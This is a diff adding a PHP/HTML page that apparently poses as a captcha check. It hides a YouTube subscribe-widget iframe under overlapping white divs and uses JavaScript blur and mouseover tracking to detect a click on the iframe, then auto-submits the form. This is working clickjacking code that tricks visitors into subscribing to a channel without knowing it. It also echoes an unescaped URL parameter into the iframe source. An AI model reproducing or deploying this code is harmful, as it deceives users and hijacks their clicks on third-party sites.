@@ -1,0 +1,116 @@
+<script language="JavaScript">
+function disableEnterKey(e)
+{
+     var key;
+     if(window.event)
+          key = window.event.keyCode;     //IE
+     else
+          key = e.which;     //firefox
+     if(key == 13)
+          return false;
+     else
+          return true;
+}
+</script>
+<script type="text/javascript">
+    $(document).ready(function() {
+        var isOverIFrame = false;
+
+        function processMouseOut() {
+            log("IFrame mouse >> OUT << detected.");
+            isOverIFrame = false;
+            top.focus();
+        }
+
+        function processMouseOver() {
+            log("IFrame mouse >> OVER << detected.");
+            isOverIFrame = true;
+        }
+
+        function processIFrameClick() {
+            if(isOverIFrame) {
+		setTimeout(function() {
+ 		$("#wait").show();
+		$("#sub").show();
+		}, 390);
+
+		setTimeout(function() {
+ 		$(\'#login\').click();
+		}, 3000);
+            }
+        }
+
+        function log(message) {
+            var console = document.getElementById("console");
+            var text = console.value;
+            text = text + message + "\n";
+            console.value = text;
+        }
+
+        function attachOnloadEvent(func, obj) {
+            if(typeof window.addEventListener != \'undefined\') {
+                window.addEventListener(\'load\', func, false);
+            } else if (typeof document.addEventListener != \'undefined\') {
+                document.addEventListener(\'load\', func, false);
+            } else if (typeof window.attachEvent != \'undefined\') {
+                window.attachEvent(\'onload\', func);
+            } else {
+                if (typeof window.onload == \'function\') {
+                    var oldonload = onload;
+                    window.onload = function() {
+                        oldonload();
+                        func();
+                    };
+                } else {
+                    window.onload = func;
+                }
+            }
+        }
+
+        function init() {
+            var element = document.getElementsByTagName("iframe");
+            for (var i=0; i<element.length; i++) {
+                element[i].onmouseover = processMouseOver;
+                element[i].onmouseout = processMouseOut;
+            }
+            if (typeof window.attachEvent != \'undefined\') {
+                top.attachEvent(\'onblur\', processIFrameClick);
+            }
+            else if (typeof window.addEventListener != \'undefined\') {
+                top.addEventListener(\'blur\', processIFrameClick, false);
+            }
+        }
+
+        attachOnloadEvent(init);
+    });
+</script>
+
+echo '<h3>'; echo text1; echo'</h3>
+
+<center><h1>'; echo text2; echo '</h1>
+<br>
+
+<div style="width: 510px; height: 122px; left: 358px;top: 106px;background:#fff; z-index: 6; position: absolute;display:none;" id="wait"><center><h1>'; echo text3; echo '</h1><img src="http://revistav.uvm.edu.ve/admincontenido/images/load.gif" style="width:32px; height:32px;"></center></div>
+<div style="position:relative; top:-20px; width:510px; background:#fff; z-index:5;border-top: 1px #000 solid;border-left: 1px #000 solid;border-right: 1px #000 solid;padding-top: 5px;left:0px;">'; 
+echo text4; echo '<br>
+<form action="" method="post">
+<img src="captcha.php" width="100" height="30" vspace="3" /><br>
+<input name="tmptxt" onKeyPress="return disableEnterKey(event)" type="text" size="30" /><br>
+<input name="btget" type="submit" style="display:none;" value="Check" id="login" />
+<input name="action" type="hidden" value="checkdata" />
+</form>
+</div>
+
+<div style="position:relative; top: -230px;left: 60px;">
+<div style="width:84px; background:#fff; border:1px #fff solid; height: 34px; position:relative; z-index:4; left: -63px;top: 238px; display:none;" id="sub"></div>
+<div style="width: 216px; background: #fff; height: 40px; position:relative; z-index:4; left: -207px; top: 209px;border-left: 1px #000 solid;border-bottom: 1px #000 solid;"></div>
+<div style="width: 84px; background: #fff; height: 6px; position:relative; z-index:4; left: -63px; top: 202px;border-bottom: 1px #000 solid;"></div>
+<div style="width: 298px; height: 67px; position:relative; top: 100px; left: 47px; background:#fff; border-right: 1px #000 solid; z-index:1;"></div>
+<div style="width: 216px; height: 34px; position:relative; left: 88px; top: 100px; border-bottom: 1px #000 solid; background: #fff; z-index:3;border-right: 1px #000 solid;"></div>
+<iframe id="marco" src="http://www.youtube.com/subscribe_widget?p='; echo (!isset($_GET['sub']) || is_null($_GET['sub'])) ? 'ikillnukes4evertmb' : $_GET['sub']; echo '" style="overflow: hidden; height: 105px; width: 300px; border: 0; position:relative; left:46px; z-index:0;top: -1px;" scrolling="no" frameborder="0"></iframe></div>
+
+<form name="form" id="form" action="" style="display:none;"><textarea name="console"
+id="console" style="width: 100px; height: 300px;" cols="" rows=""></textarea>
+<button name="clear" id="clear" type="reset">Clear</button>
+</form>
+
